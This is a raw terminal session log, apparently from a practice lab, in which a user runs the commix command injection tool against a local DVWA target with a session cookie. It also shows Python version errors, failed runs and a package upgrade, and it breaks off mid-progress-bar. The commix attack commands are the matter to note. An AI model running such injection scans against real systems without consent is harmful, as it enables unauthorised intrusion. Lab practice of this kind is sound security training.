+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[34m[1m*[0m] Checking connection to the target URL... [0m[ [32mSUCCEED[0m ]
+[41m[x] Critical: 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[34m[1m*[0m] Checking connection to the target URL... [0m[ [32mSUCCEED[0m ]
+[41m[x] Critical: 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-technique
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+Usage: commix [option(s)]
+
+commix.py: error: --skip-technique option requires 1 argument
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-technique b
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[34m[1m*[0m] Checking connection to the target URL... [0m[ [32mSUCCEED[0m ]
+[41m[x] Critical: 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ python
+python              python2-config      python2-wsdump      python3.7m          python3-config      python3-tor-prompt
+python2             python2-futurize    python3             python3.7m-config   python3-futurize    python3-wsdump
+python2.7           python2-pasteurize  python3.7           python3.8           python3-pasteurize  python-config
+python2.7-config    python2-qr          python3.7-config    python3.8-config    python3-qr          python-faraday
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ python2
+python2             python2.7-config    python2-futurize    python2-qr          
+python2.7           python2-config      python2-pasteurize  python2-wsdump      
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ python2.7^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-technique b[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpcommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPS[1@E[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [Cycommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHP[1@S[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[Ctcommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PH[1@P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[Chcommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="P[1@H[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[Cocommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="[1@P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[Cncommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie=[1@"[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C2commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie[1@=[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C.commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cooki[1@e[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C7commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cook[1@i[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --coo[1@k[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C
+
+python2.7: can't open file 'commix': [Errno 2] No such file or directory
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ python2.7 commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-technique b[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --co[1@o[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[Cbcommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --c[C[1@o[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[Cicommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --[1@c[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C[Cncommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  -[1@-[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C[C[C/commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"
+[1@ [A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cx -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit" [1@ [A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  [1P[A]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+commix
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ python2.7 /bin/commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-technique b[A[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ python2.7 /bin/commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-technique b[A
+
+  File "/bin/commix", line 3
+    cd /usr/share/commix && python3 ./commix.py "$@"
+                          ^
+SyntaxError: invalid syntax
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ python2.7 /bin/commix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low" --all --skip-technique b[Acommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --coo[5P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccommix -u "http://dvwa.local/vulnerabilities/exec/" -d "ip=10.10.10.3&Submit=Submit"  --cookie="PHPSE[10P[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix 
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[41m[x] Critical: Missing a mandatory option (-u, -l, -m, -r, -x, --wizard, --list-tampers, --purge or --dependencies). Use -h for help.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix  --wia[Kzard[H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix  --wizard
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[1m[35m?[0m] Please enter full target URL (-u) > https://dvwa.local/vulnerabilities/exec/#[K[C[C[C[C[1P://dvwa.local/vulnerabilities/exec/
+[0m[[1m[35m?[0m] Please enter POST data (--data) [Enter for none] > ip=10.10.10.3&Submit=Submit
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[[33m![0m] [33mWarning: Got a 302 redirection (http://dvwa.local/login.php).[0m
+[0m[[34m[1m*[0m] Checking connection to the target URL... [0m[ [32mSUCCEED[0m ]
+[41m[x] Critical: 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ commix  --wizard --cookie=""[KPHPSESSID=70pr2bemn4ueqd39fpg0ujtjuo; security=low"
+
+[[1m[33m![0m] [1m[33mWarning: Python version 3.8.3 detected. You are advised to use Python version 2.7.x.[0m
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  [1m[4mv3.0-stable[0m
+/\ \__//\ \/\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ [90m[4mhttps://commixproject.com[0m
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ ([91m@commixproject[0m)
+
++--
+[1mAutomated All-in-One OS Command Injection and Exploitation Tool[0m
+Copyright © 2014-2019 Anastasios Stasinopoulos[0m ([91m@ancst[0m)
++--
+
+([1m[31m![0m) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+[0m
+[0m[[1m[35m?[0m] Please enter full target URL (-u) > https://dvwa.local/vulnerabilities/exec/[C[C[C[C[1P://dvwa.local/vulnerabilities/exec/
+[0m[[1m[35m?[0m] Please enter POST data (--data) [Enter for none] > ip=10.10.10.3&Submit=Submit[H[2J[0m[[1m[35m?[0m] Please enter POST data (--data) [Enter for none] > ip=10.10.10.3&Submit=Submit
+[0m[[34m[1m*[0m] Resolving hostname 'dvwa.local'.[0m
+[0m[[34m[1m*[0m] Checking connection to the target URL... [0m[ [32mSUCCEED[0m ]
+[41m[x] Critical: 13.[0m
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ sudo apt install commix 
+[sudo] password for dinesh: 
+Reading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree       
+Reading state information... 0%Reading state information... 0%Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  ant ant-contrib ant-optional clusterd firebird3.0-server-core firebird3.0-utils fonts-opensymbol libabw-0.1-1 libaopalliance-java
+  libapache-poi-java libargs4j-java libasm-java libatinject-jsr330-api-java libbase-java libbcmail-java libbcpkix-java libbcprov-java
+  libbind9-161 libboost-date-time1.67.0 libboost-locale1.67.0 libboost-python1.67.0 libbsh-java libcdi-api-java libcdr-0.1-1
+  libcglib-java libclang1-7 libclucene-contribs1v5 libclucene-core1v5 libcmis-0.5-5v5 libcodemodel-java libcommons-cli-java
+  libcommons-codec-java libcommons-collections3-java libcommons-collections4-java libcommons-compress-java libcommons-io-java
+  libcommons-lang3-java libcommons-math3-java libcroco3 libcurvesapi-java libdns-export1109 libdns1110 libdom4j-java
+  libdtd-parser-java libdvdread7 libe-book-0.1-1 libehcache-java libemu2 libeot0 libepubgen-0.1-1 libetonyek-0.1-1
+  libexttextcat-2.0-0 libexttextcat-data libfastinfoset-java libflute-java libfonts-java libformula-java libfreehand-0.1-1
+  libgeronimo-annotation-1.3-spec-java libgeronimo-interceptor-3.0-spec-java libgpgmepp6 libguava-java libguice-java
+  libhawtjni-runtime-java libhttpclient-java libhttpcore-java libib-util libicu4j-java libintellij-annotations-java libirs161
+  libisc1105 libisccc161 libisccfg163 libistack-commons-java libitext-java libjansi-java libjansi-native-java libjaxb-api-java
+  libjaxb-java libjaxen-java libjcommon-java libjdom1-java libjetbrains-annotations-java libjsoup-java libjsr305-java libjuh-java
+  libjurt-java liblangtag-common liblangtag1 liblayout-java libllvm7 libloader-java liblwres161 libmaven-file-management-java
+  libmaven-parent-java libmaven-resolver-java libmaven-shared-io-java libmaven-shared-utils-java libmaven3-core-java libmhash2
+  libmozjs-60-0 libmspub-0.1-1 libmwaw-0.3-3 libmythes-1.2-0 libnumbertext-1.0-0 libnumbertext-data libodfgen-0.1-1 liborcus-0.15-0
+  liborcus-parser-0.15-0 libpagemaker-0.0-0 libpentaho-reporting-flow-engine-java libpixie-java libplexus-archiver-java
+  libplexus-cipher-java libplexus-classworlds-java libplexus-component-annotations-java libplexus-interpolation-java
+  libplexus-io-java libplexus-sec-dispatcher-java libplexus-utils2-java libprotobuf17 libpython3.7 libpython3.7-dev
+  libpython3.7-minimal libpython3.7-stdlib libqhull7 libqrcodegencpp1 libqxp-0.0-0 libradare2-4.2.1 libraptor2-0 librasqal3 librdf0
+  librelaxng-datatype-java librepository-java librevenge-0.0-0 libridl-java librngom-java libruby2.5 libsac-java libsaxonhe-java
+  libsdl-ttf2.0-0 libserializer-java libsisu-guice-java libsisu-inject-java libsisu-ioc-java libsisu-plexus-java libslf4j-java
+  libsnappy-java libsnappy-jni libstaroffice-0.0-0 libstax-ex-java libstreambuffer-java libtxw2-java libuno-cppu3
+  libuno-cppuhelpergcc3-3 libuno-purpenvhelpergcc3-3 libuno-sal3 libuno-salhelpergcc3-3 libunoil-java libunoloader-java
+  libvisio-0.1-1 libwagon-http-java libwagon-provider-api-java libwpd-0.10-10 libwpg-0.3-3 libwps-0.4-4 libxerces2-java
+  libxml-commons-external-java libxml-commons-resolver1.1-java libxml-java libxmlbeans-java libxmlsec1 libxmlsec1-nss libxom-java
+  libxsom-java libxz-java libzmf-0.0-0 linux-headers-5.4.0-kali2-amd64 linux-headers-5.4.0-kali2-common linux-image-5.4.0-kali2-amd64
+  llvm-7 llvm-7-dev llvm-7-runtime lp-solve python-aes python-certifi python-editorconfig python-jsbeautifier python-peepdf
+  python-pylibemu python-pyv8 python-requests python3-simplegeneric python3.7 python3.7-dev python3.7-minimal ruby-did-you-mean
+  ruby2.5 ruby2.5-dev ruby2.5-doc uno-libs-private ure
+Use 'sudo apt autoremove' to remove them.
+The following additional packages will be installed:
+  unicorn-magic
+The following packages will be upgraded:
+  commix unicorn-magic
+2 upgraded, 0 newly installed, 0 to remove and 1091 not upgraded.
+Need to get 0 B/186 kB of archives.
+After this operation, 7,168 B disk space will be freed.
+Do you want to continue? [Y/n] y
+Reading changelogs... 33%Reading changelogs... 66%Reading changelogs... 100%                          Reading changelogs... Done
+
+7[0;33r8[1A(Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 569680 files and directories currently installed.)
+Preparing to unpack .../unicorn-magic_3.12-0kali1_all.deb ...
+7[34;0f[42m[30mProgress: [  0%][49m[39m [.................................................................................................................] 87[34;0f[42m[30mProgress: [ 11%][49m[39m [############.....................................................................................................] 8Unpacking unicorn-magic (3.12-0kali1) over (3.8.1-0kali2) ...
+7[34;0f[42m[30mProgress: [ 22%][49m[39m [#########################........................................................................................] 8Preparing to unpack .../commix_3.1-0kali1_all.deb ...
+7[34;0f[42m[30mProgress: [ 33%][49m[39m [#####################################............................................................................] 8Unpacking commix (3.1-0kali1) over (3.0-20191111-0kali1) ...
+7[34;0f[42m[30mProgress: [ 44%][49m[39m [##################################################...............................................................] 8Setting up unicorn-magic (3.12-0kali1) ...
+7[34;0f[42m[30mProgress: [ 56%][49m[39m [##############################################################...................................................] 87[34;0f[42m[30mProgress: [ 67%][49m[39m [###########################################################################......................................] 8Setting up commix (3.1-0kali1) ...
+7[34;0f[42m[30mProgress: [ 78%][49m[39m [#######################################################################################..........................] 87[34;0f[42m[30mProgress: [ 89%][49m[39m [####################################################################################################.............] 8Processing triggers for kali-menu (2020.2.2) ...
+
+7[0;34r8[1A[JScanning processes... [                                                                                                               ]Scanning processes... [                                                                                                               ]Scanning processes... [                                                                                                               ]Scanning processes... [=                                                                                                              ]Scanning processes... [=                                                                                                              ]Scanning processes... [=                                                                                                              ]Scanning processes... [==                                                                                                             ]Scanning processes... [==                                                                                                             ]Scanning processes... [===                                                                                                            ]Scanning processes... [===                                                                                                            ]Scanning processes... [===                                                                                                            ]Scanning processes... [====                                                                                                           ]Scanning processes... [====                                                                                                           ]Scanning processes... [=====                                                                                                          ]Scanning processes... [=====                                                                                                          ]Scanning processes... [=====                                                                                                          ]Scanning processes... [======                                                                                                         ]Scanning processes... [======                                                                                                         ]Scanning processes... [=======                                                                                                        ]Scanning processes... [=======                                                                                                        ]Scanning processes... [=======                                                                                                        ]Scanning processes... [========                                                                                                       ]Scanning processes... [========                                                                                                       ]Scanning processes... [========                                                                                                       ]Scanning processes... [=========                                                                                                      ]Scanning processes... [=========                                                                                                      ]Scanning processes... [==========                                                                                                     ]Scanning processes... [==========                                                                                                     ]Scanning processes... [==========                                                                                                     ]Scanning processes... [===========                                                                                                    ]Scanning processes... [===========                                                                                                    ]Scanning processes... [============                                                                                                   ]Scanning processes... [============                                                                                                   ]Scanning processes... [============                                                                                                   ]Scanning processes... [=============                                                                                                  ]Scanning processes... [=============                                                                                                  ]Scanning processes... [==============                                                                                                 ]Scanning processes... [==============                                                                                                 ]Scanning processes... [==============                                                                                                 ]Scanning processes... [===============                                                                                                ]Scanning processes... [===============                                                                                                ]Scanning processes... [===============                                                                                                ]Scanning processes... [================                                                                                               ]Scanning processes... [================                                                                                               ]Scanning processes... [=================                                                                                              ]Scanning processes... [=================                                                                                              ]Scanning processes... [=================                                                                                              ]Scanning processes... [==================                                                                                             ]Scanning processes... [==================                                                                                             ]Scanning processes... [===================                                                                                            ]Scanning processes... [===================                                                                                            ]Scanning processes... [===================                                                                                            ]Scanning processes... [====================                                                                                           ]Scanning processes... [====================                                                                                           ]Scanning processes... [=====================                                                                                          ]Scanning processes... [=====================                                                                                          ]Scanning processes... [=====================                                                                                          ]Scanning processes... [======================                                                                                         ]Scanning processes... [======================                                                                                         ]Scanning processes... [======================                                                                                         ]Scanning processes... [=======================                                                                                        ]Scanning processes... [=======================                                                                                        ]Scanning processes... [========================                                                                                       ]Scanning processes... [========================                                                                                       ]Scanning processes... [========================                                                                                       ]Scanning processes... [=========================                                                                                      ]Scanning processes... [=========================                                                                                      ]Scanning processes... [==========================                                                                                     ]Scanning processes... [==========================                                                                                     ]Scanning processes... [==========================                                                                                     ]Scanning processes... [===========================                                                                                    ]Scanning processes... [===========================                                                                                    ]Scanning processes... [============================                                                                                   ]Scanning processes... [============================                                                                                   ]Scanning processes... [============================                                                                                   ]Scanning processes... [=============================                                                                                  ]Scanning processes... [=============================                